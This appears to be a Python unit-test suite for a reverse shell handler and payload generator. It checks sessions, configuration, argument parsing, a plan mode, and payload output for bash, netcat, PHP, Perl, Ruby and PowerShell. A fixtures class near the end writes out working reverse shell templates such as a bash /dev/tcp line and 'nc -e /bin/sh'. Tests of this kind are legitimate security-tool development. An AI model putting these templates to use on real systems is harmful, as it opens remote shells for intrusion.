#!/usr/bin/env python3
"""
Test Suite for Reverse Shell Handler
=====================================

Comprehensive tests for the reverse shell handler tool including
plan mode, documentation, and payload generation.
"""

import sys
import unittest
from unittest.mock import Mock, MagicMock, patch
from io import StringIO
from pathlib import Path

# Add parent directories to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from tool import (
    Session,
    HandlerConfig,
    ShellType,
    PayloadGenerator,
    get_documentation,
    create_argument_parser,
    print_plan,
    DEFAULT_PORT,
    DEFAULT_TIMEOUT
)


class TestSession(unittest.TestCase):
    """Tests for Session dataclass."""

    def test_session_creation(self):
        """Test creating a Session instance."""
        mock_socket = MagicMock()

        session = Session(
            id=1,
            socket=mock_socket,
            address=("192.168.1.100", 54321)
        )

        self.assertEqual(session.id, 1)
        self.assertEqual(session.address[0], "192.168.1.100")
        self.assertTrue(session.active)

    def test_session_to_dict(self):
        """Test serialization to dictionary."""
        mock_socket = MagicMock()

        session = Session(
            id=1,
            socket=mock_socket,
            address=("10.0.0.1", 12345),
            ssl_enabled=True
        )

        data = session.to_dict()

        self.assertIn("id", data)
        self.assertIn("address", data)
        self.assertTrue(data["ssl_enabled"])


class TestHandlerConfig(unittest.TestCase):
    """Tests for HandlerConfig dataclass."""

    def test_config_defaults(self):
        """Test default configuration values."""
        config = HandlerConfig()

        self.assertEqual(config.host, "0.0.0.0")
        self.assertEqual(config.port, DEFAULT_PORT)
        self.assertEqual(config.shell_type, ShellType.RAW)
        self.assertFalse(config.ssl_enabled)
        self.assertFalse(config.plan_mode)

    def test_config_custom_values(self):
        """Test custom configuration values."""
        config = HandlerConfig(
            host="192.168.1.1",
            port=9999,
            shell_type=ShellType.TTY,
            ssl_enabled=True,
            plan_mode=True
        )

        self.assertEqual(config.port, 9999)
        self.assertEqual(config.shell_type, ShellType.TTY)
        self.assertTrue(config.ssl_enabled)
        self.assertTrue(config.plan_mode)


class TestShellType(unittest.TestCase):
    """Tests for ShellType enum."""

    def test_shell_type_values(self):
        """Test shell type values."""
        self.assertEqual(ShellType.RAW.value, "raw")
        self.assertEqual(ShellType.TTY.value, "tty")
        self.assertEqual(ShellType.HTTP.value, "http")


class TestPayloadGenerator(unittest.TestCase):
    """Tests for PayloadGenerator class."""

    def test_bash_payload(self):
        """Test Bash payload generation."""
        payload = PayloadGenerator.bash("10.0.0.1", 4444)

        self.assertIn("10.0.0.1", payload)
        self.assertIn("4444", payload)
        self.assertIn("/dev/tcp", payload)

    def test_bash_base64_payload(self):
        """Test Base64-encoded Bash payload."""
        payload = PayloadGenerator.bash_base64("10.0.0.1", 4444)

        self.assertIn("base64", payload)

    def test_python_payload(self):
        """Test Python payload generation."""
        payload = PayloadGenerator.python("10.0.0.1", 4444)

        self.assertIn("10.0.0.1", payload)
        self.assertIn("4444", payload)
        self.assertIn("socket", payload)

    def test_netcat_payload(self):
        """Test Netcat payload generation."""
        payload = PayloadGenerator.netcat("10.0.0.1", 4444)

        self.assertIn("nc", payload)
        self.assertIn("10.0.0.1", payload)

    def test_netcat_no_e_payload(self):
        """Test Netcat payload without -e flag."""
        payload = PayloadGenerator.netcat_no_e("10.0.0.1", 4444)

        self.assertIn("mkfifo", payload)

    def test_php_payload(self):
        """Test PHP payload generation."""
        payload = PayloadGenerator.php("10.0.0.1", 4444)

        self.assertIn("php", payload)
        self.assertIn("fsockopen", payload)

    def test_perl_payload(self):
        """Test Perl payload generation."""
        payload = PayloadGenerator.perl("10.0.0.1", 4444)

        self.assertIn("perl", payload)
        self.assertIn("Socket", payload)

    def test_ruby_payload(self):
        """Test Ruby payload generation."""
        payload = PayloadGenerator.ruby("10.0.0.1", 4444)

        self.assertIn("ruby", payload)
        self.assertIn("TCPSocket", payload)

    def test_powershell_payload(self):
        """Test PowerShell payload generation."""
        payload = PayloadGenerator.powershell("10.0.0.1", 4444)

        self.assertIn("powershell", payload)
        self.assertIn("TCPClient", payload)

    def test_get_all_payloads(self):
        """Test getting all payload types."""
        payloads = PayloadGenerator.get_all("10.0.0.1", 4444)

        self.assertIn("bash", payloads)
        self.assertIn("python", payloads)
        self.assertIn("netcat", payloads)
        self.assertIn("php", payloads)

        # All payloads should contain the IP and port
        for name, payload in payloads.items():
            self.assertIn("10.0.0.1", payload)


class TestDocumentation(unittest.TestCase):
    """Tests for tool documentation."""

    def test_get_documentation_returns_dict(self):
        """Test that get_documentation returns a dictionary."""
        doc = get_documentation()
        self.assertIsInstance(doc, dict)

    def test_documentation_has_required_fields(self):
        """Test that documentation has all required fields."""
        doc = get_documentation()

        required_fields = ["name", "description", "usage"]
        for field in required_fields:
            self.assertIn(field, doc, f"Missing required field: {field}")

    def test_documentation_name(self):
        """Test documentation name."""
        doc = get_documentation()
        name_lower = doc["name"].lower()
        self.assertTrue("shell" in name_lower or "handler" in name_lower)


class TestArgumentParser(unittest.TestCase):
    """Tests for argument parser."""

    def test_parser_creation(self):
        """Test parser can be created."""
        parser = create_argument_parser()
        self.assertIsNotNone(parser)

    def test_parser_has_plan_flag(self):
        """Test parser has --plan flag."""
        parser = create_argument_parser()

        plan_found = False
        for action in parser._actions:
            if '--plan' in action.option_strings or '-p' in action.option_strings:
                plan_found = True
                break

        self.assertTrue(plan_found, "Parser should have --plan flag")

    def test_parser_port_argument(self):
        """Test parser accepts port argument."""
        parser = create_argument_parser()
        args = parser.parse_args(['--port', '9999'])

        self.assertEqual(args.port, 9999)

    def test_parser_host_argument(self):
        """Test parser accepts host argument."""
        parser = create_argument_parser()
        args = parser.parse_args(['--host', '192.168.1.1'])

        self.assertEqual(args.host, '192.168.1.1')


class TestPlanMode(unittest.TestCase):
    """Tests for plan mode functionality."""

    def test_print_plan_produces_output(self):
        """Test that print_plan produces output."""
        config = HandlerConfig(
            host="0.0.0.0",
            port=4444,
            plan_mode=True
        )

        captured = StringIO()
        sys.stdout = captured
        try:
            print_plan(config)
        finally:
            sys.stdout = sys.__stdout__

        output = captured.getvalue()
        self.assertTrue(len(output) > 0)

    def test_plan_mode_shows_port(self):
        """Test that plan output shows port."""
        config = HandlerConfig(
            port=9999,
            plan_mode=True
        )

        captured = StringIO()
        sys.stdout = captured
        try:
            print_plan(config)
        finally:
            sys.stdout = sys.__stdout__

        output = captured.getvalue()
        self.assertIn("9999", output)

    def test_plan_mode_shows_host(self):
        """Test that plan shows listening host."""
        config = HandlerConfig(
            host="192.168.1.1",
            port=4444,
            plan_mode=True
        )

        captured = StringIO()
        sys.stdout = captured
        try:
            print_plan(config)
        finally:
            sys.stdout = sys.__stdout__

        output = captured.getvalue()
        self.assertIn("192.168.1.1", output)


class TestConstants(unittest.TestCase):
    """Tests for module constants."""

    def test_default_port(self):
        """Test default port constant."""
        self.assertEqual(DEFAULT_PORT, 4444)

    def test_default_timeout(self):
        """Test default timeout constant."""
        self.assertEqual(DEFAULT_TIMEOUT, 300)


class TestInputValidation(unittest.TestCase):
    """Tests for input validation."""

    def test_default_args(self):
        """Test parser with default arguments."""
        parser = create_argument_parser()
        args = parser.parse_args([])

        # Should use defaults without error
        self.assertIsNotNone(args)


# =============================================================================
# Test Fixtures
# =============================================================================

class ReverseShellHandlerFixtures:
    """Test fixtures for reverse shell handler."""

    # Sample payloads for verification
    PAYLOAD_TEMPLATES = {
        "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "python": "python3 -c 'import socket...",
        "netcat": "nc -e /bin/sh {host} {port}",
        "php": "php -r '$sock=fsockopen...",
    }

    # Test addresses
    TEST_ADDRESSES = [
        ("192.168.1.100", 4444),
        ("10.0.0.1", 9999),
        ("127.0.0.1", 1337)
    ]

    @classmethod
    def get_test_session(cls, session_id: int = 1):
        """Create a test session."""
        mock_socket = MagicMock()

        return Session(
            id=session_id,
            socket=mock_socket,
            address=cls.TEST_ADDRESSES[0]
        )

    @classmethod
    def verify_payload_contains_address(cls, payload: str, host: str, port: int) -> bool:
        """Verify a payload contains the expected address."""
        return host in payload and str(port) in payload


if __name__ == '__main__':
    unittest.main(verbosity=2)
